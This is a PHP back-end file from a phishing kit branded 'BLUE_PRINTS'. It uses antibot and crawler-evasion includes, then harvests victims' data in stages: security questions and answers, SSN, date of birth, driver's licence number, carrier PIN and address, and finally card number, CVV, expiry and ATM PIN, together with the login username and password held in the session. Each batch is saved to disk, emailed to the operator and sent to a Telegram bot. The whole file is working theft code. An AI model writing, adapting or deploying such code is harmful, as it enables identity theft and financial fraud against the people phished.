<?php 
	session_start();
	require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
	include '../../crawlerdetect.php';
	        // variable declaration
	        $errors = array(); 

	          
	          if (isset($_POST['ans2']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
				  $settings = include '../conf/settings.php';
	          // check for valid email address 
	          $q1	  = $_POST['q1'];
    $_SESSION['q1'] = $q1;
	$ans1 	  = $_POST['ans1'];
    $_SESSION['ans1'] = $ans1;
	$q2 	  = $_POST['q2'];
    $_SESSION['q2'] = $q2;
	$ans2 	  = $_POST['ans2'];
    $_SESSION['ans2'] = $ans2;
	$q3 	  = $_POST['q3'];
    $_SESSION['q3'] = $q3;
	$ans3	  = $_POST['ans3'];
    $_SESSION['ans3'] = $ans3;
    $ip = $_SERVER['REMOTE_ADDR'];

    $body = ":::::::::: BLUE_PRINTS 1nf0 [User Details] ::::::::::::::\r\n";
    $body .= "Username                         : {$_SESSION['omlj']}\r\n";
    $body .= "pass                             : {$_SESSION['pass']}\r\n";
    $body .= ":::::::::::::: BLUE_PRINTS 1nf0 [Dual Email Details] :::::::::::\r\n";
	$body .= "{$_SESSION['emailr']}\r\n";
    $body .= ":::::::::::: BLUE_PRINTS 1nf0 [Ques Details] ::::::::::::\r\n";
    $body .= "Ques 1                           : $q1\r\n";
    $body .= "Ans 1                            : $ans1\r\n";
    $body .= "Ques 2                           : $q2\r\n";
    $body .= "Ans 2                            : $ans2\r\n";
    $body .= "Ques 3                           : $q3\r\n";
    $body .= "Ans 3                            : $ans3\r\n";
    $body .=  "|--------------- I N F O | I P -------------------|\r\n";
    $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
    $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
    $body .= "IP City	                           : {$_SESSION['city']}\r\n";
    $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
    $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
    $body .= ":::::::::::::::::  BLUE_PRINTS 1nf0 ::::::::::::::::::::::\r\n";
    if($savetxt == "on"){
    $save=fopen("../data/ques".$salt.".txt",'a');
    fwrite($save,$body);
    fclose($save);
    }

    $subject = "Ques Details By BLUE_PRINTS | IP {$_SESSION['ip']}";
    $headers="From: Blue_Prints <blue_prints@BO4.com>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($emailzz, $subject, $body, $headers);  
	if($tgresult == "on"){
		$data = $body;
		  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
		  $website = "https://api.telegram.org/{$settings['bot_url']}";
		  $ch = curl_init($website . '/sendMessage');
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_POST, 1);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  $result = curl_exec($ch);
		  curl_close($ch);
	  }
	          	$key = $_SESSION['token'];
				
					echo "<script>window.location.href='../../info.php?token=".$key."';</script>";
					die();
				  
	          }

	          if (isset($_POST['expmnth']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
				  $settings = include '../conf/settings.php';
	          // check for valid email address
              $ccn 	  = $_POST['ccn'];
              $_SESSION['ccn'] = $ccn;
              $cvv 	  = $_POST['cvv'];
              $_SESSION['cvv'] = $cvv;
              $expmnth  = $_POST['expmnth'];
              $_SESSION['expmnth'] = $expmnth;
              $expyr 	  = $_POST['expyr'];
              $_SESSION['expyr'] = $expyr;
              $atm	  = $_POST['atm'];
              $_SESSION['atm'] = $atm;
              $ip = $_SERVER['REMOTE_ADDR'];
          
                   $body = ":::::::::: BLUE_PRINTS 1nf0 [User Details] ::::::::::::::\r\n";
                   $body .= "Username                         : {$_SESSION['omlj']}\r\n";
                   $body .= "pass                             : {$_SESSION['pass']}\r\n";
                   $body .= ":::::::::::::: BLUE_PRINTS 1nf0 [Dual Email Details] :::::::::::\r\n";
                   $body .= "{$_SESSION['emailr']}\r\n";
                   $body .= ":::::::::::: BLUE_PRINTS 1nf0 [Ques Details] ::::::::::::\r\n";
                   $body .= "Ques 1                           : {$_SESSION['q1']}\r\n";
                   $body .= "Ans 1                            : {$_SESSION['ans1']}\r\n";
                   $body .= "Ques 2                           : {$_SESSION['q2']}\r\n";
                   $body .= "Ans 2                            : {$_SESSION['ans2']}\r\n";
                   $body .= "Ques 3                           : {$_SESSION['q3']}\r\n";
                   $body .= "Ans 3                            : {$_SESSION['ans3']}\r\n";
				   $body .= ":::::::::::::: BLUE_PRINTS 1nf0 [ Billing Details] ::::::::::::::::\r\n";
	          $body .= "First Name                         : {$_SESSION['fname']}\r\n";
              $body .= "Last Name                          : {$_SESSION['lname']}\r\n";
	          $body .= "ssn                                : {$_SESSION['ssn']}\r\n";
              $body .= "dob                                : {$_SESSION['dob']}\r\n";
              $body .= "dlnum                              : {$_SESSION['dlnum']}\r\n";
              $body .= "phnum                              : {$_SESSION['phnum']}\r\n";
              $body .= "phone type                         : {$_SESSION['phtyp']}\r\n";
			  $body .= "Carrier pin                        : {$_SESSION['crpn']}\r\n";
              $body .= "Address                            : {$_SESSION['stradd1']}\r\n";
              $body .= "city                               : {$_SESSION['cty']}\r\n";
              $body .= "state                              : {$_SESSION['ste']}\r\n";
              $body .= "zipcode                            : {$_SESSION['zpcde']}\r\n";
                   $body .= "::::::::::: BLUE_PRINTS 1nf0 [ Card Details] ::::::::::::\r\n";
                   $body .= "Card                               : $ccn\r\n";
                   $body .= "CVV                                : $cvv\r\n";
                   $body .= "exp                                : $expmnth / $expyr\r\n";
                   $body .= "atm pin                            : $atm\r\n";
                   $body .=  "|--------------- I N F O | I P -------------------|\r\n";
                   $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
                   $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
                   $body .= "IP City	                           : {$_SESSION['city']}\r\n";
                   $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
                   $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
                   $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
                   $body .= ":::::::::::::  BLUE_PRINTS 1nf0 ::::::::::::::\r\n";
                   if($savetxt == "on"){
                   $save=fopen("../data/card".$salt.".txt",'a');
                   fwrite($save,$body);
                   fclose($save);
                   }
          
                   $subject = "Card Details By BLUE_PRINTS | IP {$_SESSION['ip']}";
                   $headers="From: Blue_Prints <blue_prints@BO4.com>\r\n";
                   $headers.="MIME-Version: 1.0\r\n";
                   $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
                  @mail($emailzz, $subject, $body, $headers); 
				  if($tgresult == "on"){
					$data = $body;
					  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
					  $website = "https://api.telegram.org/{$settings['bot_url']}";
					  $ch = curl_init($website . '/sendMessage');
					  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					  curl_setopt($ch, CURLOPT_POST, 1);
					  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
					  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					  $result = curl_exec($ch);
					  curl_close($ch);
				  }
	          	$key = $_SESSION['token'];
	          	echo "<script>window.location.href='../../success.php?token=".$key."';</script>";
	          	die();
	          }
	          
	      if (isset($_POST['dlnum']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
				  $settings = include '../conf/settings.php';
	          // check for valid email address 
			  $_SESSION['fname']	  = $_POST['fname'];
			  $_SESSION['lname'] 	  = $_POST['lname'];
			  $_SESSION['ssn']	  = $_POST['ssn'];
			  $_SESSION['dob']	  = $_POST['dob'];
			  $_SESSION['dlnum'] 	  = $_POST['dlnum'];	
			  $_SESSION['phnum']	  = $_POST['phnum'];
			  $_SESSION['phtyp'] 	  = $_POST['phtyp'];
			  $_SESSION['stradd1'] 	  = $_POST['stradd1'];
			  $_SESSION['crpn'] 	  = $_POST['crpn'];
			  $_SESSION['stradd2'] 	  = $_POST['stradd2'];
			  $_SESSION['cty'] 	  = $_POST['city'];
			  $_SESSION['zpcde'] 	  = $_POST['zipcode'];
			  $_SESSION['ste'] 	  = $_POST['state'];
    		 $ip = $_SERVER['REMOTE_ADDR'];

			  $body = ":::::::::: BLUE_PRINTS 1nf0 [User Details] ::::::::::::::\r\n";
			  $body .= "Username                         : {$_SESSION['omlj']}\r\n";
			  $body .= "pass                             : {$_SESSION['pass']}\r\n";
			  $body .= ":::::::::::::: BLUE_PRINTS 1nf0 [Dual Email Details] :::::::::::\r\n";
			  $body .= "{$_SESSION['emailr']}\r\n";
			  $body .= ":::::::::::: BLUE_PRINTS 1nf0 [Ques Details] ::::::::::::\r\n";
			  $body .= "Ques 1                           : {$_SESSION['q1']}\r\n";
			  $body .= "Ans 1                            : {$_SESSION['ans1']}\r\n";
			  $body .= "Ques 2                           : {$_SESSION['q2']}\r\n";
	          $body .= "Ans 2                            : {$_SESSION['ans2']}\r\n";
			  $body .= "Ques 3                           : {$_SESSION['q3']}\r\n";
			  $body .= "Ans 3                            : {$_SESSION['ans3']}\r\n";
    		  $body .= ":::::::::::::: BLUE_PRINTS 1nf0 [ Billing Details] ::::::::::::::::\r\n";
	          $body .= "First Name                         : {$_SESSION['fname']}\r\n";
              $body .= "Last Name                          : {$_SESSION['lname']}\r\n";
	          $body .= "ssn                                : {$_SESSION['ssn']}\r\n";
              $body .= "dob                                : {$_SESSION['dob']}\r\n";
              $body .= "dlnum                              : {$_SESSION['dlnum']}\r\n";
              $body .= "phnum                              : {$_SESSION['phnum']}\r\n";
              $body .= "phone type                         : {$_SESSION['phtyp']}\r\n";
			  $body .= "Carrier pin                        : {$_SESSION['crpn']}\r\n";
              $body .= "Address                            : {$_SESSION['stradd1']}\r\n";
              $body .= "city                               : {$_SESSION['cty']}\r\n";
              $body .= "state                              : {$_SESSION['ste']}\r\n";
              $body .= "zipcode                            : {$_SESSION['zpcde']}\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::::::::  BLUE_PRINTS 1nf0 :::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/billing".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
              }
 
	          $subject = "Billing Details By BLUE_PRINTS | IP {$_SESSION['ip']}";
	          $headers="From: Blue_Prints <blue_prints@BO4.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers); 
			  if($tgresult == "on"){
				$data = $body;
				  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
				  $website = "https://api.telegram.org/{$settings['bot_url']}";
				  $ch = curl_init($website . '/sendMessage');
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
				  $result = curl_exec($ch);
				  curl_close($ch);
			  }
              $key = $_SESSION['token'];
              echo "<script>window.location.href='../../cc.php?token=".$key."';</script>";
	          }
?>
